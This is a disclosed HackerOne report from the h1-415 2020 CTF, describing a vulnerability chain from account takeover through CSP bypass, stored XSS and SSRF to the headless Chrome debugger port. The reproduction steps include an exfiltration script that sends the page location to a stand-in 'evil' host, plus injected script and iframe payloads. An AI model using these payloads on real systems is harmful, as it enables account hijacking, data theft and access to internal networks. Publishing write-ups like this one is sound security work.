{"id":781281,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODEyODE=","url":"https://hackerone.com/reports/781281","title":"[h1-415 2020] Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-23T06:00:34.450Z","submitted_at":"2020-01-23T06:00:34.450Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"checkm50","url":"/checkm50","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-03T21:33:38.441Z","bug_reporter_agreed_on_going_public_at":"2020-02-03T21:33:38.371Z","team_member_agreed_on_going_public_at":"2020-02-03T20:35:38.725Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Note:\n**Please read this report as \"An attacker taking over a customer's account\" and not as \"helping Jobert recovering his document\" :)**\n\n## Summary:\nChaining following issues let's an attacker access sensitive information,\n1. Exposure of customer email and regex logic error leading to account takeover\n2. CSP bypass leading to arbitrary script execution on support portal and forced browsing\n3. Exposure of internal host name\n4. Insufficient authorization control allowing attacker to update other user's details\n5. Stored XSS + SSRF leading to port scanning and access to internal resources\n\n## Steps To Reproduce:\n1. Regex logic error leading to account takeover - jobert@mydocz.cosmic email exposed in source code\n   1a. 'jobert@mydocz.cosmic' seems to be a customer of MyDocz and the system does not allow any new registration with same email ID\n   1b. Turn BurpSuite intercept on and capture following request,\n         https://h1-415.h1ctf.com/register\n   1c. Modify the email ID parameter as 'jobert@mydocz.cosmic\u003c' , the flaw here is the QR code generation process trims following symbols \n         {\u003c\u003e}\n   1d. Now after registration, save the QR code that the system generates\n   1e. Logout of the application and navigate to https://h1-415.h1ctf.com/recover\n   1f. Select the QR code saved previously and **now you have become jobert@mydocz.cosmic**\n\n2. CSP bypass leading to arbitrary script execution on support portal and forced browsing\n     2a. Support portal is vulnerable to HTML injection. One can bypass CSP rules like this\n     https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js\n     2b. This triggers script execution on support portal but it is self-xss\n     2c. Now right click on firefox/chrome and run following function,\n           showReviewModal()\n     2d. Rating 1 star makes the support agent review the chat logs and hence the script can be executed on agent's client\n     2e. With a crafted script like below (Same as the script on 40.js), an attacker and gain information about the URL that the support agent \n      is using,\n      ```loc = document.location\n      var img1 = document.createElement('img');\n      img1.src = 'http://evil/image.png?loc='+loc\n      document.body.appendChild(img1);```\n\n3. Exposure of internal host name and user agent\n    3a. After performing step 2e, the attacker can now see the internal URL that the agent is using,\n    https://localhost:3000/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\n    3b. Attacker can change the 'localhost:3000' to 'h1-415.h1ctf.com' in order to access the chat page that the support agent is viewing\n \n\n4. Insufficient authorization control allowing attacker to update other user's details,\nFor further attack we need two accounts. We already have one, an attacker can also create trial account. **We will refer to this account as second account**\n    4a. As you can see, the review page from step 3a. contains an option to update user details\n    4b. Attacker can now update second account's \"name\" field, using following POST call,\n          https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\n          name=\u003cinject-here\u003e\u0026email=jobert%40mydocz.cosmic\u0026username=jobert\u0026user_id=\u003csecond account user_id\u003e\u0026_csrf_token=987d\n\n5. Stored XSS + SSRF leading to port scanning and access to internal resources\n     5a. From step 4b, we know that an attacker has to ability to update account information of another user\n     5b. This becomes worst because the attacker is also able to inject script like below\n     name=\u003cscript src='external.com/some.js'\u003e\u0026email=jobert%40mydocz.cosmic\u0026username=jobert\u0026user_id=6\u0026_csrf_token=987d\n     5c. An attacker can use this to inject an iframe like below and escalate the situation to SSRF (Port scanning and access internal resource)\n     name=\u003ciframe src='http://localhost:9222/json' width=900 height=900\u003e\u003c/iframe\u003e\n     5d. 9222 port because the user-agent says that it is headless chrome hence 9222 which is the debugger port\n     5e. the /json end point reveals a secret document\n\nThe secret document contains,\n## h1ctf{y3s_1m_c0sm1c_n0w}\n\n## Supporting Material/References:\n1. Support-portal.png\n2. chat-review-page.png\n3. external-interaction-ssrftest.png\n4. user-update-ssrf.png\n5. The-FLAG.png\n\nSpecial thanks to @pirateducky, @almadjus and @mcipekci  :)\n\n##Remediation:\nHire me :)\n\n## Impact\n\nAn attacker is able to, \nachieve **take over of customers account**, \n**compromise the integrity** of the platform by updating other user accounts\n**Infiltrate into internal network**\nresulting in **Critical** impact","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-04T20:35:38.814Z","allow_singular_disclosure_after":-50611873.01837355,"singular_disclosure_allowed":true,"vote_count":10,"voters":["nytr0gen","defparam","sameerphad72","0xacb","prophet","nukedx","b9372d4605459ca97219795","raginx","shivam010","hrw"],"severity":{"rating":"critical","score":9.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":42751,"asset_type":"URL","asset_identifier":"https://h1-415.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6847203,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Could you please add @almadjus as collaborator?","automated_response":false,"created_at":"2020-01-23T06:06:39.077Z","updated_at":"2020-01-23T06:08:16.322Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6847416,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"You did it! Good work! \n\nalmadjus doesn't exist on HackerOne. Can you get me their username :)? ","automated_response":false,"created_at":"2020-01-23T07:14:29.375Z","updated_at":"2020-01-23T07:14:29.375Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6849084,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot Ben :)\nThe name is al-madjus ","automated_response":false,"created_at":"2020-01-23T12:11:27.063Z","updated_at":"2020-01-23T12:11:27.063Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6852656,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there,\n\nJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \n\nThanks! ","automated_response":false,"created_at":"2020-01-23T18:13:03.775Z","updated_at":"2020-01-23T18:13:03.775Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6862446,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nahamsec ,\nA gentle reminder to add @al-madjus :)","automated_response":false,"created_at":"2020-01-24T14:53:10.432Z","updated_at":"2020-01-24T14:53:10.432Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6881192,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @nahamsec ,\nA gentle reminder to add @al-madjus :)","automated_response":false,"created_at":"2020-01-27T15:34:45.189Z","updated_at":"2020-01-27T15:34:45.189Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6934229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @checkm50 - Apologies for not having the collaboration feature enabled for this CTF. I'll make a note of it and make sure we enable it for all of our CTFs moving forward. I'm going to go ahead and add @al-madjus right now.","automated_response":false,"created_at":"2020-01-31T17:16:43.674Z","updated_at":"2020-01-31T17:16:43.674Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934377,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-01-31T17:31:47.185Z","updated_at":"2020-01-31T17:31:47.185Z","actor":{"username":"al-madjus","cleared":false,"url":"/al-madjus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/340/244/c9666ba3cc7b1d2720860b836b33fdacfa969b78_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6934770,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot @nahamsec :)\nWelcome @al-madjus :)","automated_response":false,"created_at":"2020-01-31T18:01:04.541Z","updated_at":"2020-01-31T18:01:04.541Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6934794,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for adding me :-)","automated_response":false,"created_at":"2020-01-31T18:03:59.207Z","updated_at":"2020-01-31T18:03:59.207Z","actor":{"username":"al-madjus","cleared":false,"url":"/al-madjus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/340/244/c9666ba3cc7b1d2720860b836b33fdacfa969b78_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6934795,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You're welcome! Sorry we didn't get to it earlier.","automated_response":false,"created_at":"2020-01-31T18:04:04.251Z","updated_at":"2020-01-31T18:04:04.251Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934806,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Hackers! \n\nI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! ","automated_response":false,"created_at":"2020-01-31T18:04:59.253Z","updated_at":"2020-01-31T18:04:59.253Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953834,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-02-03T20:32:39.396Z","updated_at":"2020-02-03T20:32:39.396Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"checkm50","url":"/checkm50"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953860,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-02-03T20:35:38.747Z","updated_at":"2020-02-03T20:35:38.747Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6954318,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the quick fix team. Let’s disclose since the issues are fixed :)","automated_response":false,"created_at":"2020-02-03T21:33:38.393Z","updated_at":"2020-02-03T21:33:38.393Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6954319,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-02-03T21:33:38.460Z","updated_at":"2020-02-03T21:33:38.460Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8236809,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-06-08T21:12:39.598Z","updated_at":"2020-06-08T21:12:39.598Z","additional_data":{"old_title":"Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources","new_title":"[h1-415 2020] Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}